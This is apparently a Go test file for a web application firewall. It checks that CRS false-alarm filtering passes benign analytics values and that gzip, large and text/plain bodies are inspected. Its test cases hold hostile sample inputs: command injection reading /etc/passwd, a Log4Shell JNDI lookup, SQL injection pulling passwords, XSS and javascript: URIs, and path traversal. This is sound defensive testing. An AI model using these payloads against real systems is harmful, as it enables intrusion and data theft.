package waf

import (
	"bytes"
	"compress/gzip"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestCRSFalseAlarmsRound2(t *testing.T) {
	cases := []struct {
		id    int
		value string
		drop  bool
	}{
		{932270, "5e7d0d152027daaf3a145f39f3ca2a00~0~yaaqfse1f0qv9x", true},
		{932270, "x;~/bin/sh", false},
		{932270, "~root", false},
		{932130, "https://a.example/sync?uid=${profile_id}&cb=${random}", true},
		{932130, "${bundle_id}", true},
		{932130, "cat${IFS}/etc/passwd", false},
		{932130, "${jndi:ldap://e.example/a}", false},
		{932130, "${user_id}$(id)", false},
		{933135, "${us_privacy}", true},
		{932130, "https://sync.example/c?gdpr=${user.gdpr}&c=${user.consentstr}", true},
		{932130, "https://s.example/ecm3?id=${uipid()}", true},
		{932130, "${user.gdpr}$(id)", false},
		{932130, "${a.b}", false},
		{932130, "${jndi:ldap://e.example/${user.x}}", false},
		{942550, "%7B%22distinct_id%22%3A%20%221926%22%2C%22bc_id%22%3A%20-1916%7D", true},
		{942550, "%7B%22id%22%3A%22x%27%20or%201%3D1--%22%7D", false},
		{942550, `{"octothorpe":"{\"FP_VER\":\"4\",\"MTGUID\":\"2\"}"}`, true},
		{942550, `{"a":1} or 1=1`, false},
		{942550, `{"id":"1 union select password from users"}`, false},
		{942550, `'{"a":1}'::jsonb`, false},
	}
	for _, c := range cases {
		if got := crsFalseAlarm(c.id, "ARGS:x", c.value, false); got != c.drop {
			t.Errorf("%d %q: dropped=%v, want %v", c.id, c.value, got, c.drop)
		}
	}
}

func TestGzipBodyInspected(t *testing.T) {
	rules, _ := LoadRules("")
	e := NewEngine(rules, 5)
	gz := func(s string) []byte {
		var b bytes.Buffer
		w := gzip.NewWriter(&b)
		w.Write([]byte(s))
		w.Close()
		return b.Bytes()
	}
	post := func(body []byte) Decision {
		r := httptest.NewRequest("POST", "/collect", bytes.NewReader(body))
		r.Header.Set("Content-Type", "application/json")
		r.Header.Set("Content-Encoding", "gzip")
		return e.Inspect(r, body)
	}
	if d := post(gz(`{"q":"1' UNION SELECT password FROM users--"}`)); !d.Attack {
		t.Errorf("SQL injection inside gzip passed: %v", d.Matches)
	}
	if d := post(gz(`{"q":"<script>alert(1)</script>"}`)); !d.Attack {
		t.Errorf("XSS inside gzip passed: %v", d.Matches)
	}
	if d := post(gz(`{"events":[{"name":"page_view","ts":1719928199526}]}`)); d.Attack {
		t.Errorf("gzip analytics blocked: %v", d.Matches)
	}
	if d := post([]byte(`{"events":[{"name":"page_view"}]}`)); d.Attack {
		t.Errorf("plain body labelled gzip blocked: %v", d.Matches)
	}
	bomb := gz(strings.Repeat("a", MaxDecodedBody+10))
	if ok, out := decodeBody(httptest.NewRequest("POST", "/", nil), bomb); ok || len(out) != len(bomb) {
		t.Error("no Content-Encoding must leave the body alone")
	}
}

func TestLargeParsedBody(t *testing.T) {
	rules, _ := LoadRules("")
	e := NewEngine(rules, 5)
	var b strings.Builder
	b.WriteString(`{"events":[`)
	for i := 0; b.Len() < 3*MaxFieldBytes; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`{"name":"page_view","path":"/products/shoes","title":"` + strings.Repeat("Running shoes for men ", 20) + `"}`)
	}
	ok := b.String() + `]}`
	bad := b.String() + `,{"name":"1' UNION SELECT password FROM users--"}]}`
	post := func(s string) Decision {
		r := httptest.NewRequest("POST", "/collect", strings.NewReader(s))
		r.Header.Set("Content-Type", "application/json")
		return e.Inspect(r, []byte(s))
	}
	if d := post(ok); d.Attack {
		t.Errorf("large analytics batch blocked: %v", d.Matches)
	}
	if d := post(bad); !d.Attack {
		t.Error("injection inside a large JSON body passed")
	}
}

func TestLargeTextJSONAndHeaderlessGzip(t *testing.T) {
	rules, _ := LoadRules("")
	e := NewEngine(rules, 5)
	big := `{"events":[` + strings.Repeat(`{"title":"`+strings.Repeat("Running shoes ", 30)+`"},`, 400) + `{"x":1}]}`
	post := func(ct string, body []byte) Decision {
		r := httptest.NewRequest("POST", "/beacon", bytes.NewReader(body))
		r.Header.Set("Content-Type", ct)
		return e.Inspect(r, body)
	}
	if d := post("text/plain", []byte(big)); d.Attack {
		t.Errorf("large JSON beacon blocked: %v", d.Matches)
	}
	evil := strings.Replace(big, `{"x":1}`, `{"x":"<script>alert(1)</script>"}`, 1)
	if d := post("text/plain", []byte(evil)); !d.Attack {
		t.Error("XSS in a large text/plain JSON body passed")
	}
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	w.Write([]byte("q=1' UNION SELECT password FROM users--"))
	w.Close()
	if d := post("text/plain", b.Bytes()); !d.Attack {
		t.Error("SQL injection in headerless gzip passed")
	}
}

func TestCRSFalseAlarmsRound2b(t *testing.T) {
	cases := []struct {
		id       int
		variable string
		value    string
		drop     bool
	}{
		{930120, "ARGS_NAMES:json.profile_id", "json.profile_id", true},
		{930120, "ARGS_NAMES:json.a", "../../.profile", false},
		{930120, "ARGS:file", "../../.profile", false},
		{941170, "ARGS:v", "javascript:2.8.18", true},
		{941170, "ARGS:oid", "javascript:void(0);", true},
		{941170, "ARGS:b", `{"destination":"javascript:;","id":""}`, true},
		{941170, "ARGS:c", `{"geometry":"data:image/png;base64,iVBORw0KGgo"}`, true},
		{941170, "ARGS:x", "javascript:alert(1)", false},
		{941170, "ARGS:x", "javascript:void(0);alert(1)//javascript:alert(1)", false},
		{941170, "ARGS:x", "data:text/html;base64,PHNjcmlwdD4=", false},
		{941170, "ARGS:x", "javascript:1;alert(1)", false},
		{941170, "ARGS:x", "javascript:;alert(1)", false},
		{941170, "ARGS:x", "javascript:void(0);alert(1)", false},
	}
	for _, c := range cases {
		if got := crsFalseAlarm(c.id, c.variable, c.value, false); got != c.drop {
			t.Errorf("%d %s %q: dropped=%v, want %v", c.id, c.variable, c.value, got, c.drop)
		}
	}
}
